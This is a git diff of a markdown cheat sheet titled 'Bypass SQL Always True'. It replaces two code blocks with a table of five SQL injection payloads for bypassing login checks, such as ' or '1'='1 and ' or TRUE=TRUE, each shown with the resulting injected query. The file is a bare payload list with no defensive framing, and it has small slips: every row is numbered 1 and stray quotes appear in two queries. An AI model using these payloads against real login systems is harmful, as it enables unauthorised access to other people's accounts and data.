@@ -1,17 +1,10 @@
 ## Bypass SQL Always True
 
-```php
-// payload
-' or '1'='1
 
-// example query
-"SELECT * FROM user WHERE username = '' or '1'='1' AND password = '' or '1'='1'" 
-```
-
-```php
-// payload
-'' or 1=1
-
-// example query
-"SELECT * FROM user WHERE username = '' or 1=1 AND password = '' or 1=1" 
-```
+|NO  |PAYLOAD  | EXAMPLE QUERY |
+|--|--|--|
+| 1 | ```' or '1'='1``` |```SELECT * FROM user WHERE username = '' or '1'='1' AND password = '' or '1'='1';```|
+| 1 | ```' or username!=''``` |```SELECT * FROM user WHERE username = '' or username!='' AND password = '' or password!='';```|
+| 1 | ```' or FALSE!=TRUE``` |```SELECT * FROM user WHERE username = '' or FALSE!=TRUE AND password = '' or FALSE!=TRUE;```|
+| 1 | ```' or TRUE=TRUE``` |```SELECT * FROM user WHERE username = '' or TRUE=TRUE AND password = '' or TRUE=TRUE";```|
+| 1 | ```' or 1=1``` |```SELECT * FROM user WHERE username = '' or 1=1 AND password = '' or 1=1" ;```|
